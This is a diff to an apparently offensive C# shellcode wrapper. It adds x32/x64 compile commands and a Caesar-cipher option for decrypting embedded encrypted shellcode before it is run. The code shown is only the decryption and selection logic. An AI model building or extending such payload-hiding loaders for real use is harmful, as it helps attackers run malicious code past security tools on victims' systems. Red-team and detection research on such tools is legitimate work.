@@ -3,7 +3,8 @@ Author: Arno0x0x, Twitter: @Arno0x0x
 
 How to compile:
 ===============
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:encryptedShellcodeWrapper_${cipherType}.exe encryptedShellcodeWrapper_${cipherType}.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x32 /out:encryptedShellcodeWrapper_${cipherType}.exe encryptedShellcodeWrapper_${cipherType}.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 /out:encryptedShellcodeWrapper_${cipherType}.exe encryptedShellcodeWrapper_${cipherType}.cs
 
 */
 
@@ -39,6 +40,15 @@ namespace RunShellCode
             return decrypted;
         }
 
+        private static byte[] caesar(byte[] cipher, int key) {
+            byte[] decrypted = new byte[cipher.Length];
+    
+	    for (int i = 0; i < cipher.Length; i++){
+                decrypted[i] = (byte)(((uint)cipher[i] - key) & 0xFF);
+            }
+
+            return decrypted;
+        }
         //--------------------------------------------------------------------------------------------------
         // Decrypts the given a plaintext message byte array with a given 128 bits key
         // Returns the unencrypted message
@@ -87,6 +97,9 @@ namespace RunShellCode
             }
             else if (cipherType == "aes") {
                 shellcode = aesDecrypt(encryptedShellcode, Convert.FromBase64String(key));
+            }
+            else if (cipherType == "caesar") {
+                shellcode = caesar(encryptedShellcode, Int32.Parse(key));
             }
                         
             //--------------------------------------------------------------        	
